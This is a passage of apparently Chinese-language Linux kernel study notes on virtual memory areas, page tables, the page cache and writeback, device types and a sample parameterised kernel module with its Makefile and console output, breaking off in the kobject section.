<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> * <span class="title">vm_mm</span>;</span>    <span class="comment">/* 相关的 mm_struct 结构体 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_start;        <span class="comment">/* 内存区域首地址 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_end;        <span class="comment">/* 内存区域尾地址 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* linked list of VM areas per task, sorted by address */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vm_next</span>, *<span class="title">vm_prev</span>;</span>  <span class="comment">/* VMA链表 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">pgprot_t</span> vm_page_prot;        <span class="comment">/* 访问控制权限 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_flags;        <span class="comment">/* 标志 */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">vm_rb</span>;</span>       <span class="comment">/* 树上的VMA节点 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * For areas with an address space and backing store,</span></span><br><span class="line"><span class="comment">     * linkage into the address_space-&gt;i_mmap prio tree, or</span></span><br><span class="line"><span class="comment">     * linkage to the list of like vmas hanging off its node, or</span></span><br><span class="line"><span class="comment">     * linkage of vma in the address_space-&gt;i_mmap_nonlinear list.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">            <span class="keyword">void</span> *parent;    <span class="comment">/* aligns with prio_tree_node parent */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">head</span>;</span></span><br><span class="line">        &#125; vm_set;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">raw_prio_tree_node</span> <span class="title">prio_tree_node</span>;</span></span><br><span class="line">    &#125; shared;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * A file&#x27;s MAP_PRIVATE vma can be in both i_mmap tree and anon_vma</span></span><br><span class="line"><span class="comment">     * list, after a COW of one of the file pages.    A MAP_SHARED vma</span></span><br><span class="line"><span class="comment">     * can only be in the i_mmap tree.  An anonymous MAP_PRIVATE, stack</span></span><br><span class="line"><span class="comment">     * or brk vma (with NULL file) can only be in an anon_vma list.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">anon_vma_node</span>;</span>    <span class="comment">/* Serialized by anon_vma-&gt;lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">anon_vma</span> *<span class="title">anon_vma</span>;</span>    <span class="comment">/* Serialized by page_table_lock */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Function pointers to deal with this struct. */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Information about our backing store: */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_pgoff;        <span class="comment">/* Offset (within vm_file) in PAGE_SIZE</span></span><br><span class="line"><span class="comment">                       units, *not* PAGE_CACHE_SIZE */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">vm_file</span>;</span>        <span class="comment">/* File we map to (can be NULL). */</span></span><br><span class="line">    <span class="keyword">void</span> * vm_private_data;        <span class="comment">/* was vm_pte (shared mem) */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_truncate_count;<span class="comment">/* truncate_count or restart_addr */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_region</span> *<span class="title">vm_region</span>;</span>    <span class="comment">/* NOMMU mapping region */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mempolicy</span> *<span class="title">vm_policy</span>;</span>    <span class="comment">/* NUMA policy for the VMA */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>地址空间和页表</strong></p>
<p>地址空间中的地址都是虚拟内存中的地址，而CPU需要操作的是物理内存（内核操作的也是物理内存），所以需要一个将虚拟地址映射到物理地址的机制</p>
<p>这个机制就是页表，linux 中使用3级页面来完成虚拟地址到物理地址的转换</p>
<ul>
<li>PGD - 全局页目录，包含一个 pgd_t 类型数组，多数体系结构中 pgd_t 类型就是一个无符号长整型</li>
<li>PMD - 中间页目录，它是个 pmd_t 类型数组</li>
<li>PTE - 简称页表，包含一个 pte_t 类型的页表项，该页表项指向物理页面</li>
</ul>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1661508765929-1661853278313.png" class width="1661508765929"> 
<h2 id="页高速缓存-amp-页回写"><a href="#页高速缓存-amp-页回写" class="headerlink" title="页高速缓存&amp;页回写"></a>页高速缓存&amp;页回写</h2><p>为了提高 I/O 性能，也引入了缓存机制，即将一部分磁盘上的数据缓存到内存中 </p>
<p>之所以通过缓存能提高 I/O 性能是基于以下2个重要的原理：</p>
<ul>
<li>CPU访问内存的速度远远大于访问磁盘的速度（访问速度差距不是一般的大，差好几个数量级）</li>
<li>数据一旦被访问，就有可能在短期内再次被访问（临时局部原理）</li>
</ul>
<p><strong>页高速缓存</strong></p>
<p>页缓存和硬件 cache 的原理基本相同，将容量大而低速设备中的部分数据存放到容量小而快速的设备中，这样速度快的设备将作为低速设备的缓存，当访问低速设备中的数据时，可以直接从缓存中获取数据而不需再访问低速设备，从而节省了整体的访问时间</p>
<ul>
<li>页高速缓存缓存的是具体的物理页面，与前面章节中提到的虚拟内存空间 vm_area_struct 不同</li>
<li>假设有进程创建了多个 vm_area_struct 都指向同一个文件，那么这个 vm_area_struct 对应的页高速缓存只有一份</li>
<li>也就是磁盘上的文件缓存到内存后，它的虚拟内存地址可以有多个，但是物理内存地址却只能有一个</li>
</ul>
<p>为了有效提高 I/O 性能，页高速缓存要需要满足以下条件：</p>
<ul>
<li>能够快速检索需要的内存页是否存在</li>
<li>能够快速定位脏页面（也就是被写过，但还没有同步到磁盘上的数据）</li>
<li>页高速缓存被并发访问时，尽量减少并发锁带来的性能损失</li>
</ul>
<p>实现页高速缓存的最重要的结构体要算是 address_space：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span>        *<span class="title">host</span>;</span>        <span class="comment">/* 拥有此address_space的inode对象 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">radix_tree_root</span>    <span class="title">page_tree</span>;</span>    <span class="comment">/* 包含全部页面的radix树 */</span></span><br><span class="line">    <span class="keyword">spinlock_t</span>        tree_lock;    <span class="comment">/* 保护radix树的自旋锁 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        i_mmap_writable;<span class="comment">/* VM_SHARED计数 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">prio_tree_root</span>    <span class="title">i_mmap</span>;</span>        <span class="comment">/* 私有映射链表的树 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">i_mmap_nonlinear</span>;</span><span class="comment">/* VM_NONLINEAR链表 */</span></span><br><span class="line">    <span class="keyword">spinlock_t</span>        i_mmap_lock;    <span class="comment">/* 保护i_map的自旋锁 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        truncate_count;    <span class="comment">/* 截断计数 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>        nrpages;    <span class="comment">/* 总页数 */</span></span><br><span class="line">    <span class="keyword">pgoff_t</span>            writeback_index;<span class="comment">/* 回写的起始偏移 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">address_space_operations</span> *<span class="title">a_ops</span>;</span>    <span class="comment">/* address_space的操作表 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>        flags;        <span class="comment">/* gfp_mask掩码与错误标识 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">backing_dev_info</span> *<span class="title">backing_dev_info</span>;</span> <span class="comment">/* 预读信息 */</span></span><br><span class="line">    <span class="keyword">spinlock_t</span>        private_lock;    <span class="comment">/* 私有 address_space自旋锁 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">private_list</span>;</span>    <span class="comment">/* 私有 address_space链表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>    *<span class="title">assoc_mapping</span>;</span>    <span class="comment">/* 缓冲 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>        <span class="title">unmap_mutex</span>;</span>    <span class="comment">/* 保护未映射页的mutux锁 */</span></span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="keyword">long</span>))));</span><br></pre></td></tr></table></figure>
<p>这里的 Radix 树（基数树）就是页高速缓存的底层算法</p>
<p><strong>页回写</strong></p>
<p>Linux 页高速缓存中的回写是由内核中的一个线程(flusher 线程)来完成的，flusher 线程在以下3种情况发生时，触发回写操作：</p>
<ul>
<li>一，当空闲内存低于一个阀值时：<ul>
<li>空闲内存不足时，需要释放一部分缓存，由于只有不脏的页面才能被释放，所以要把脏页面都回写到磁盘，使其变成干净的页面</li>
</ul>
</li>
<li>二，当脏页在内存中驻留时间超过一个阀值时：<ul>
<li>确保脏页面不会无限期的驻留在内存中，从而减少了数据丢失的风险</li>
</ul>
</li>
<li>三，当用户进程调用 sync() 和 fsync() 系统调用时：<ul>
<li>给用户提供一种强制回写的方法，应对回写要求严格的场景</li>
</ul>
</li>
</ul>
<h2 id="设备-amp-模块"><a href="#设备-amp-模块" class="headerlink" title="设备&amp;模块"></a>设备&amp;模块</h2><p><strong>设备类型</strong></p>
<p>Linux 中主要由3种类型的设备，分别是：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left"><strong>设备类型</strong></th>
<th style="text-align:left"><strong>代表设备</strong></th>
<th style="text-align:left"><strong>特点</strong></th>
<th style="text-align:left"><strong>访问方式</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">块设备</td>
<td style="text-align:left">硬盘，光盘</td>
<td style="text-align:left">随机访问设备中的内容</td>
<td style="text-align:left">一般都是把设备挂载为文件系统后再访问</td>
</tr>
<tr>
<td style="text-align:left">字符设备</td>
<td style="text-align:left">键盘，打印机</td>
<td style="text-align:left">只能顺序访问（一个一个字符或者一个一个字节）</td>
<td style="text-align:left">一般不挂载，直接和设备交互</td>
</tr>
<tr>
<td style="text-align:left">网络设备</td>
<td style="text-align:left">网卡</td>
<td style="text-align:left">打破了Unix “所有东西都是文件” 的设计原则</td>
<td style="text-align:left">通过套接字API来访问</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>除了以上3种典型的设备之外，其实Linux中还有一些其他的设备类型，其中见的较多的应该算是”伪设备”</li>
<li>所谓”伪设备”，其实就是一些虚拟的设备，仅提供访问内核功能而已，没有物理设备与之关联</li>
<li>典型的”伪设备”就是 /dev/random(内核随机数发生器)， /dev/null(空设备)， /dev/zero(零设备)， /dev/full(满设备)</li>
</ul>
<p><strong>内核模块</strong></p>
<p>Linux 内核是模块化组成的，内核中的模块可以按需加载，从而保证内核启动时不用加载所有的模块，即减少了内核的大小，也提高了效率</p>
<ul>
<li>通过编写内核模块来给内核增加功能或者接口是个很好的方式（既不用重新编译内核，也方便调试和删除）</li>
</ul>
<p>带参数的内核模块的示例：（我在网上抄了个示例，打 kernel pwn 的时候可能会用到）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span>* name;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_student</span><span class="params">(struct student*)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> stu_id = <span class="number">0</span>;  <span class="comment">// 默认id</span></span><br><span class="line">module_param(stu_id, <span class="keyword">int</span>, <span class="number">0644</span>);</span><br><span class="line">MODULE_PARM_DESC(stu_id, <span class="string">&quot;学生ID，默认为 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span>* stu_name_in = <span class="string">&quot;default name&quot;</span>; <span class="comment">// 默认名字</span></span><br><span class="line">module_param_named(stu_name_out, stu_name_in ,charp, <span class="number">0644</span>);</span><br><span class="line">MODULE_PARM_DESC(stu_name, <span class="string">&quot;学生姓名，默认为 default name&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ARR_LEN 5</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> arr_len;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> arr_in[MAX_ARR_LEN];</span><br><span class="line">module_param_array_named(arr_out, arr_in, <span class="keyword">int</span>, &amp;arr_len, <span class="number">0644</span>);</span><br><span class="line">MODULE_PARM_DESC(arr_in, <span class="string">&quot;数组参数，默认为空&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">test_paramed_km_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">student</span>* <span class="title">stu1</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 进入内核模块 */</span></span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;*************************\n&quot;</span>);</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;test_paramed_km is inited!\n&quot;</span>);</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;*************************\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 根据参数生成 struct student 信息</span></span><br><span class="line">    <span class="comment">// 如果没有参数就用默认参数</span></span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;alloc one student....\n&quot;</span>);</span><br><span class="line">    stu1 = kmalloc(<span class="keyword">sizeof</span>(*stu1), GFP_KERNEL);</span><br><span class="line">    stu1-&gt;id = stu_id;</span><br><span class="line">    stu1-&gt;name = stu_name_in;</span><br><span class="line">    print_student(stu1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模块数组</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; arr_len; ++i) &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;arr_value[%d]: %d\n&quot;</span>, i, arr_in[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test_paramed_km_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* 退出内核模块 */</span></span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;*************************\n&quot;</span>);</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;test_paramed_km is exited!\n&quot;</span>);</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;*************************\n&quot;</span>);</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;\n\n\n\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_student</span><span class="params">(struct student *stu)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stu != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;**********student info***********\n&quot;</span>);</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;student id   is: %d\n&quot;</span>, stu-&gt;id);</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;student name is: %s\n&quot;</span>, stu-&gt;name);</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;*********************************\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;the student info is null!!\n&quot;</span>);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(test_paramed_km_init);</span><br><span class="line">module_exit(test_paramed_km_exit);</span><br></pre></td></tr></table></figure>
<p>上面的示例对应的 Makefile 如下： </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> must complile on customize kernel</span></span><br><span class="line">obj-m += paramed_km.o</span><br><span class="line">paramed_km-objs := test_paramed_km.o</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">generate the path</span></span><br><span class="line">CURRENT_PATH:=$(shell pwd)</span><br><span class="line"><span class="meta">#</span><span class="bash">the current kernel version number</span></span><br><span class="line">LINUX_KERNEL:=$(shell uname -r)</span><br><span class="line"><span class="meta">#</span><span class="bash">the absolute path</span></span><br><span class="line">LINUX_KERNEL_PATH:=/usr/src/kernels/$(LINUX_KERNEL)</span><br><span class="line"><span class="meta">#</span><span class="bash">complie object</span></span><br><span class="line">all:</span><br><span class="line">    make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) modules</span><br><span class="line">    rm -rf modules.order Module.symvers .*.cmd *.o *.mod.c .tmp_versions *.unsigned</span><br><span class="line"><span class="meta">#</span><span class="bash">clean</span></span><br><span class="line">clean:</span><br><span class="line">    rm -rf modules.order Module.symvers .*.cmd *.o *.mod.c *.ko .tmp_versions *.unsigned</span><br></pre></td></tr></table></figure>
<p>内核模块运行方法：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">[root@vbox chap17]# ll   &lt;-- 编译内核后,多了paramed_km.ko文件</span><br><span class="line">total 124</span><br><span class="line">-rw-r--r-- 1 root root    538 Dec  1 19:37 Makefile</span><br><span class="line">-rw-r--r-- 1 root root 118352 Dec  1 19:37 paramed_km.ko</span><br><span class="line">-rw-r--r-- 1 root root   2155 Dec  1 19:37 test_paramed_km.c</span><br><span class="line"></span><br><span class="line">&lt;-- 通过 modinfo 命令可以查看对内核模块参数的注释</span><br><span class="line">[root@vbox chap17]# modinfo  paramed_km.ko</span><br><span class="line">filename:       paramed_km.ko</span><br><span class="line">license:        Dual BSD/GPL</span><br><span class="line">srcversion:     C52F97687B033738742800D</span><br><span class="line">depends:</span><br><span class="line">vermagic:       2.6.32-279.el6.x86_64 SMP mod_unload modversions</span><br><span class="line">parm:           stu_id:学生ID，默认为 0 (int)</span><br><span class="line">parm:           stu_name_out:charp</span><br><span class="line">parm:           stu_name_in:学生姓名，默认为 default name</span><br><span class="line">parm:           arr_out:array of int</span><br><span class="line">parm:           arr_in:数组参数，默认为空</span><br><span class="line"></span><br><span class="line">&lt;-- 3 个参数都是默认的</span><br><span class="line">[root@vbox chap17]# insmod paramed_km.ko</span><br><span class="line">[root@vbox chap17]# rmmod paramed_km.ko</span><br><span class="line">[root@vbox chap17]# dmesg | tail -16  &lt;-- 结果中显示2个默认参数,第3个数组参数默认为空,所以不显示</span><br><span class="line">*************************</span><br><span class="line">test_paramed_km is inited!</span><br><span class="line">*************************</span><br><span class="line">alloc one student....</span><br><span class="line">**********student info***********</span><br><span class="line">student id   is: 0</span><br><span class="line">student name is: default name</span><br><span class="line">*********************************</span><br><span class="line">*************************</span><br><span class="line">test_paramed_km is exited!</span><br><span class="line">*************************</span><br><span class="line"></span><br><span class="line">&lt;-- 3 个参数都被设置</span><br><span class="line">[root@vbox chap17]# insmod paramed_km.ko stu_id=100 stu_name_out=myname arr_out=1,2,3,4,5</span><br><span class="line">[root@vbox chap17]# rmmod paramed_km.ko</span><br><span class="line">[root@vbox chap17]# dmesg | tail -21</span><br><span class="line">*************************</span><br><span class="line">test_paramed_km is inited!</span><br><span class="line">*************************</span><br><span class="line">alloc one student....</span><br><span class="line">**********student info***********</span><br><span class="line">student id   is: 100</span><br><span class="line">student name is: myname</span><br><span class="line">*********************************</span><br><span class="line">arr_value[0]: 1</span><br><span class="line">arr_value[1]: 2</span><br><span class="line">arr_value[2]: 3</span><br><span class="line">arr_value[3]: 4</span><br><span class="line">arr_value[4]: 5</span><br><span class="line">*************************</span><br><span class="line">test_paramed_km is exited!</span><br><span class="line">*************************</span><br></pre></td></tr></table></figure>
<p><strong>内核对象</strong></p>
<p>Linux-2.6-kernel 中增加了一个引人注目的新特性：统一设备模型(device model)</p>
<ul>
<li>统一设备模型的最初动机是为了实现智能的电源管理，linux 内核为了实现智能电源管理，需要建立表示系统中所有设备拓扑关系的树结构</li>
<li>这样在关闭电源时，可以从树的节点开始关闭</li>
</ul>
<p>实现了统一设备模型之后，还给内核带来了如下的好处:</p>
<ul>
<li>代码重复最小化（统一处理的东西多了）</li>
<li>可以列举系统中所有设备，观察它们的状态，并查看它们连接的总线</li>
<li>可以将系统中的全部设备以树的形式完整，有效的展示出来—包括所有总线和内部连接</li>
<li>可以将设备和其对应的驱动联系起来，反之亦然</li>
<li>可以将设备按照类型加以归类，无需理解物理设备的拓扑结构</li>
<li>可以沿设备树的叶子向其根的反向依次遍历，以保证能以正确的顺序关闭设备电源</li>
</ul>
<p>kobject：</p>
<p>统一设备模型的核心部分就是 kobject，通过下面对 kobject 结构体的介绍，可以大致了解它是如何使得各个物理设备能够以树结构的形式组织起来的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>        *name;                   <span class="comment">/* kobject 名称 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">entry</span>;</span>               <span class="comment">/* kobject 链表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kobject</span>        *<span class="title">parent</span>;</span>             <span class="comment">/* kobject 的父对象，说明kobject是有层次结构的 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kset</span>        *<span class="title">kset</span>;</span>                   <span class="comment">/* kobject 的集合，接下来有详细介绍 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kobj_type</span>    *<span class="title">ktype</span>;</span>              <span 